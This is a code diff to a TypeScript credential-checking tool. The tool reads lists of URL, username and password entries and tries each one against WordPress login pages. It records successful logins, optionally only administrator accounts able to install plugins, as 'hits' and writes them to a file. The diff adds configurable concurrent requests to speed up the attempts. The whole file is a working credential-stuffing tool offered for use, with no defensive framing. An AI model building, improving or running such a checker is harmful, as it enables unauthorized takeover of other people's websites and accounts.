@@ -9,6 +9,7 @@ import { IWordpress, LogEntry } from './interfaces/wp.interfaces';
 import blessed from 'blessed';
 import yargs from 'yargs/yargs';
 import { hideBin } from 'yargs/helpers';
+import semaphore from 'semaphore';
 
 const argv = yargs(hideBin(process.argv))
     .option('admin-only', {
@@ -24,6 +25,11 @@ const argv = yargs(hideBin(process.argv))
         type: 'boolean',
         description: 'Enable debug mode'
     })
+    .option('concurrency', {
+        type: 'number',
+        description: 'Number of concurrent requests',
+        default: 5
+    })
     .demandCommand(1, 'You need to provide a filename')
     .help()
     .argv;
@@ -32,6 +38,7 @@ const filename: string = argv._[0] as string;
 const adminOnly: boolean = argv['admin-only'];
 const outputFile: string = argv.output;
 const debugMode: boolean = argv.debug;
+const concurrency: number = argv.concurrency;
 
 const screen = blessed.screen({
     smartCSR: true,
@@ -50,6 +57,7 @@ const logBox = blessed.box({
     content: banner(),
     tags: true,
     scrollable: true,
+    size: 'auto',
     alwaysScroll: true,
     scrollbar: {
         ch: ' ',
@@ -76,14 +84,16 @@ class Wordpress implements IWordpress {
     public start: number;
     public logBuffer: LogEntry[];
     private client: any;
+    private sem: any;
 
-    constructor() {
+    constructor(concurrency: number) {
         this.hits = 0;
         this.bad = 0;
         this.cpm = 0;
         this.start = Date.now();
         this.logBuffer = [];
         this.client = wrapper(axios.create({ jar: new CookieJar() }));
+        this.sem = semaphore(concurrency);
         this.updateTitle();
         this.calculateCpm();
     }
@@ -125,83 +135,86 @@ class Wordpress implements IWordpress {
     }
 
     async checkAccount(url: string, username: string, password: string): Promise<void> {
-        try {
-            const payload = new URLSearchParams({
-                'log': username,
-                'pwd': password,
-                'wp-submit': 'Log In',
-                'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
-                'testcookie': '1'
-            });
+        this.sem.take(async () => {
+            try {
+                const payload = new URLSearchParams({
+                    'log': username,
+                    'pwd': password,
+                    'wp-submit': 'Log In',
+                    'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
+                    'testcookie': '1'
+                });
 
-            const headers = {
-                'User-Agent': 'Mozilla/5.0',
-                'Referer': url
-            };
+                const headers = {
+                    'User-Agent': 'Mozilla/5.0',
+                    'Referer': url
+                };
 
-            if (!/^https?:\/\//i.test(url)) {
-                url = 'https://' + url;
-            }
-
-            const response = await this.client.post(url, payload.toString(), {
-                headers,
-                maxRedirects: 0,
-                validateStatus: (status) => status === 302 || status === 200,
-                withCredentials: true
-            });
-
-            const cookies = response.headers['set-cookie'];
-            if (debugMode) {
-                console.log('Response headers:', response.headers);
-            }
-
-            if (cookies && cookies.some(cookie => cookie.startsWith('wordpress_logged_in'))) {
-                const dashboardUrl = url.replace('wp-login.php', 'wp-admin/');
-                const cookieHeader = cookies.join('; ');
-
-                if (debugMode) {
-                    console.log('Attempting to access dashboard URL:', dashboardUrl);
+                if (!/^https?:\/\//i.test(url)) {
+                    url = 'https://' + url;
                 }
 
-                const r = await this.client.get(dashboardUrl, {
-                    headers: {
-                        ...headers,
-                        'Cookie': cookieHeader
-                    },
+                const response = await this.client.post(url, payload.toString(), {
+                    headers,
+                    maxRedirects: 0,
+                    validateStatus: (status) => status === 302 || status === 200,
                     withCredentials: true
                 });
 
+                const cookies = response.headers['set-cookie'];
                 if (debugMode) {
-                    console.log('Final response data:', r.data);
+                    console.log('Response headers:', response.headers);
                 }
 
-                let isAdmin = true;
+                if (cookies && cookies.some(cookie => cookie.startsWith('wordpress_logged_in'))) {
+                    const dashboardUrl = url.replace('wp-login.php', 'wp-admin/');
+                    const cookieHeader = cookies.join('; ');
 
-                if (adminOnly) {
-                    isAdmin = r.data.includes("plugin-install.php");
-                }
+                    if (debugMode) {
+                        console.log('Attempting to access dashboard URL:', dashboardUrl);
+                    }
 
-                if (isAdmin && (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar'))) {
-                    this.hits += 1;
-                    this.logBuffer.push({ type: 'HIT', url, username, password });
-                    fs.writeFileSync(outputFile, `${url} - ${username}|${password}\n`, { flag: 'a' });
+                    const r = await this.client.get(dashboardUrl, {
+                        headers: {
+                            ...headers,
+                            'Cookie': cookieHeader
+                        },
+                        withCredentials: true
+                    });
+
+                    if (debugMode) {
+                        console.log('Final response data:', r.data);
+                    }
+
+                    let isAdmin = true;
+
+                    if (adminOnly) {
+                        isAdmin = r.data.includes("plugin-install.php");
+                    }
+
+                    if (isAdmin && (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar'))) {
+                        this.hits += 1;
+                        this.logBuffer.push({ type: 'HIT', url, username, password });
+                        fs.writeFileSync(outputFile, `${url} - ${username}|${password}\n`, { flag: 'a' });
+                    } else {
+                        this.bad += 1;
+                        this.logBuffer.push({ type: 'BAD', url, username, password });
+                    }
                 } else {
                     this.bad += 1;
                     this.logBuffer.push({ type: 'BAD', url, username, password });
                 }
-            } else {
+            } catch (error) {
+                if (debugMode) {
+                    console.error(`Error checking account ${username}@${url}:`, error);
+                }
                 this.bad += 1;
                 this.logBuffer.push({ type: 'BAD', url, username, password });
+            } finally {
+                this.displayUI();
+                this.sem.leave();
             }
-        } catch (error) {
-            if (debugMode) {
-                console.error(`Error checking account ${username}@${url}:`, error);
-            }
-            this.bad += 1;
-            this.logBuffer.push({ type: 'BAD', url, username, password });
-        } finally {
-            this.displayUI();
-        }
+        });
     }
 }
 
@@ -243,11 +256,11 @@ function showLoadingScreen(): Promise<void> {
             clearInterval(loadingInterval);
             screen.remove(loadingBox);
             resolve();
-        }, 5000); 
+        }, 5000); // Simulate a 5-second loading time
     });
 }
 
-function readAccounts(filename: string): void {
+function readAccounts(filename: string, wp: Wordpress): void {
     const fileStream = fs.createReadStream(filename);
     const rl = readline.createInterface({
         input: fileStream,
@@ -265,14 +278,14 @@ function readAccounts(filename: string): void {
     });
 }
 
-const wp = new Wordpress();
+const wp = new Wordpress(concurrency);
 
 showLoadingScreen().then(() => {
     wp.displayUI();
-    readAccounts(filename);
+    readAccounts(filename, wp);
 });
 
 process.on('SIGINT', () => {
-    console.log('Wait a few seconds for threads to exit...');
+
     process.exit();
 });
